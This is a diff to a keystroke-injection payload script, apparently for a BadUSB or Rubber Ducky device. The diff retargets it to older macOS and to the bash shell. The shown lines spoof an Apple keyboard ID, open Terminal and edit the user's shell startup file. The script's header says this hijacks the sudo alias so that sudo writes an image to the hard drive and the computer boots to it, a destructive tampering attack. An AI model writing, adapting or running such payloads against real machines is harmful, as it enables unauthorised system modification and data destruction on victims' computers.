@@ -1,5 +1,5 @@
 REM Author FalsePhilosopher
-REM Target OSx 10.15+
+REM Target OSx 10.14 and below
 REM Props SkeletonMan for the idea
 REM Changes the sudo alias to write a nyan cat to the hard drive so the computer boots to a nyan cat
 ID 05ac:021e Apple:Keyboard
@@ -10,7 +10,7 @@ STRING terminal.app
 DELAY 300
 ENTER
 DELAY 1000
-STRING nano ~/.zshrc
+STRING nano ~/.bashrc
 DELAY 500
 CTRL w
 DELAY 150
